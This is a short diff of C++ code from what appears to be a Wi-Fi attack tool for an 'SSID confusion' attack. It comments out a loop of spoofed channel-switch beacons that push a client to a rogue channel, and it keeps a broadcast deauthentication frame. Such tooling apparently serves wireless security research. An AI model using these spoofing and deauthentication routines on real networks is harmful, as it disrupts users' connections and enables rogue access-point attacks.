@@ -59,14 +59,14 @@ void SsidConfusion::run(RunStatus &rs, int timeout_sec) {
     rs.process_manager.write_log_all(ATTACK_START_tag);
 
     // Initial CSA burst: spoof WrongNet MAC, push client ch 11 -> ch 1
-    for(int pass = 0; pass < 3; ++pass) {
+    /*for(int pass = 0; pass < 3; ++pass) {
         for(int cnt = CSA_attack::CHANNEL_SWITCH_MAX; cnt >= 0; --cnt) {
             RadioTap csa = CSA_attack::get_CSA_beacon(
                 ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, cnt, beacon.get());
             send_to_real(csa);
             interruptible_sleep(milliseconds(beacon_ms));
         }
-    }
+    }*/
 
     // broadcast deauth so client re-scans
     Dot11Deauthentication deauth(HWAddress<6>::broadcast, HWAddress(ap_bssid));
